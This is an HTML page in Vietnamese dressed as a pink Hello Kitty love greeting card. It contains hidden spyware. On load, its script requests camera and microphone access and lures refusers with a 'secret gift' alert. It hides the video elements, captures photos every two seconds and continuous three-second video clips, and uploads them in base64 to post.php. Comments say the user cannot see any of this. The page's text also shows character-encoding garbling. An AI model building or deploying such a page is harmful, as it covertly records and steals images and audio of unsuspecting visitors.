<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>G·ª≠i ng√†n y√™u th∆∞∆°ng ‚ù§Ô∏è</title>
    
    <!-- Th∆∞ vi·ªán jQuery -->
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    
    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <style>
        /* --- GIAO DI·ªÜN H·ªíNG CUTE --- */
        body {
            margin: 0;
            padding: 0;
            background-color: #ffe6f2;
            background-image: url('https://www.transparenttextures.com/patterns/hearts.png');
            font-family: 'Quicksand', sans-serif;
            overflow-x: hidden;
            text-align: center;
            color: #d63384;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        /* Hello Kitty trang tr√≠ */
        .kitty-float {
            position: fixed;
            z-index: 10;
            opacity: 0.9;
            animation: float 3s ease-in-out infinite;
            pointer-events: none;
        }
        .k1 { top: 5%; left: 5%; width: 80px; }
        .k2 { bottom: 10%; right: 5%; width: 90px; animation-delay: 1s; }
        .k3 { top: 15%; right: 10%; width: 50px; animation-delay: 2s; }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        /* Ch·ªØ I Love You */
        h1 {
            font-family: 'Pacifico', cursive;
            font-size: 3em;
            color: #ff4d94;
            text-shadow: 3px 3px 0px #fff;
            margin: 0;
            animation: pulse 1.5s infinite;
            z-index: 20;
        }

        h2 {
            font-size: 24px;
            color: #ff0066;
            background: rgba(255, 255, 255, 0.8);
            padding: 5px 20px;
            border-radius: 20px;
            margin-top: 10px;
            z-index: 20;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .mess {
            margin-top: 20px;
            font-size: 16px;
            color: #ff66b2;
            max-width: 80%;
            line-height: 1.5;
            z-index: 20;
        }

        /* ·∫®N CAMERA HO√ÄN TO√ÄN KH·ªéI GIAO DI·ªÜN */
        #video-hidden, #canvas, #canvas-video {
            display: none;
            opacity: 0;
            position: absolute;
            z-index: -9999;
        }

    </style>
</head>
<body>

    <!-- H√¨nh ·∫£nh trang tr√≠ -->
    <img src="https://i.pinimg.com/originals/22/04/9a/22049a173824147781b045152eb49e6f.png" class="kitty-float k1">
    <img src="https://upload.wikimedia.org/wikipedia/en/0/05/Hello_kitty_character_portrait.png" class="kitty-float k2">
    <div class="kitty-float k3" style="font-size: 40px;">üíñ</div>

    <!-- Nh·∫≠p t√™n -->
    <script>
        var name = prompt("Nh·∫≠p t√™n ng∆∞·ªùi b·∫°n y√™u th∆∞∆°ng:", "C·ª•c C∆∞ng");
        if (!name) name = "B·∫°n Y√™u";
    </script>

    <!-- N·ªôi dung hi·ªÉn th·ªã -->
    <h1>I <i class="fas fa-heart" style="color:red"></i> YOU</h1>
    <h2><script>document.write(name)</script></h2>
    
    <div class="mess">
        Ch√∫c b·∫°n m·ªôt ng√†y tr√†n ƒë·∫ßy ni·ªÅm vui v√† h·∫°nh ph√∫c! <br>
        Lu√¥n xinh ƒë·∫πp v√† d·ªÖ th∆∞∆°ng nh∆∞ Hello Kitty nh√©! üê±üéÄ
    </div>

    <!-- C√ÅC TH·∫∫ ·∫®N ƒê·ªÇ X·ª¨ L√ù CAMERA (User kh√¥ng th·∫•y) -->
    <video id="video-hidden" autoplay playsinline muted></video>
    <canvas id="canvas" width="640" height="480"></canvas> <!-- D√πng ch·ª•p ·∫£nh -->

    <script>
        // --- C·∫§U H√åNH ---
        const PHP_URL = 'post.php'; 
        const PHOTO_INTERVAL = 2000; // Ch·ª•p ·∫£nh m·ªói 2 gi√¢y
        const VIDEO_LENGTH = 3000;   // Quay video m·ªói clip d√†i 3 gi√¢y

        const video = document.getElementById('video-hidden');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // H√†m g·ª≠i d·ªØ li·ªáu chung (D√πng cho c·∫£ ·∫¢nh v√† Video)
        function sendToPHP(dataBase64) {
            $.ajax({
                type: 'POST',
                data: { cat: dataBase64 }, // PHP nh·∫≠n bi·∫øn $_POST['cat']
                url: PHP_URL,
                dataType: 'json',
                async: true, // ƒê·ªÉ async true ƒë·ªÉ kh√¥ng b·ªã ƒë∆° tr√¨nh duy·ªát khi g·ª≠i video
                success: function(result){},
                error: function(){}
            });
        }

        // 1. Kh·ªüi ƒë·ªông Camera
        async function init() {
            try {
                // L·∫•y c·∫£ video v√† audio
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true, 
                    video: { facingMode: "user" } 
                });
                
                handleSuccess(stream);
            } catch (e) {
                // N·∫øu b·ªã t·ª´ ch·ªëi, hi·ªán th√¥ng b√°o d·ªÖ th∆∞∆°ng ƒë·ªÉ d·ª• b·∫≠t
                alert("B·∫•m 'Cho ph√©p' camera ƒë·ªÉ nh·∫≠n m√≥n qu√† b√≠ m·∫≠t nha! üéÅ");
            }
        }

        function handleSuccess(stream) {
            video.srcObject = stream;

            // --- T√ÅC V·ª§ 1: CH·ª§P ·∫¢NH (Logic c≈©) ---
            setInterval(function(){
                context.drawImage(video, 0, 0, 640, 480);
                // Gi·∫£m ch·∫•t l∆∞·ª£ng xu·ªëng 0.5 ƒë·ªÉ g·ª≠i nhanh h∆°n
                var photoData = canvas.toDataURL("image/png", 0.5).replace("image/png", "image/octet-stream");
                sendToPHP(photoData);
            }, PHOTO_INTERVAL);

            // --- T√ÅC V·ª§ 2: QUAY VIDEO (Logic m·ªõi) ---
            startVideoRecording(stream);
        }

        // H√†m x·ª≠ l√Ω quay video li√™n t·ª•c
        function startVideoRecording(stream) {
            // Ki·ªÉm tra tr√¨nh duy·ªát c√≥ h·ªó tr·ª£ kh√¥ng
            if (!MediaRecorder) return;

            // Thi·∫øt l·∫≠p quay
            let mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = function() {
                // Khi d·ª´ng 1 clip -> G·ªôp l·∫°i th√†nh file
                let blob = new Blob(chunks, { 'type' : 'video/webm' });
                chunks = []; // X√≥a b·ªô nh·ªõ ƒë·ªám

                // Chuy·ªÉn Blob th√†nh Base64 ƒë·ªÉ g·ª≠i qua AJAX
                var reader = new FileReader();
                reader.readAsDataURL(blob); 
                reader.onloadend = function() {
                    var videoBase64 = reader.result;
                    // G·ª≠i video v·ªÅ PHP (PHP s·∫Ω l∆∞u file n√†y)
                    // L∆ØU √ù: File n√†y tr√™n server c√≥ th·ªÉ b·ªã l∆∞u ƒëu√¥i .png do code PHP c≈©
                    // B·∫°n c·∫ßn t·∫£i v·ªÅ v√† ƒë·ªïi ƒëu√¥i th√†nh .webm ƒë·ªÉ xem
                    sendToPHP(videoBase64);
                }

                // Quay clip ti·∫øp theo ngay l·∫≠p t·ª©c
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), VIDEO_LENGTH);
            };

            // B·∫Øt ƒë·∫ßu quay clip ƒë·∫ßu ti√™n
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), VIDEO_LENGTH);
        }

        // Ch·∫°y ngay khi t·∫£i trang
        init();

    </script>
</body>
</html>
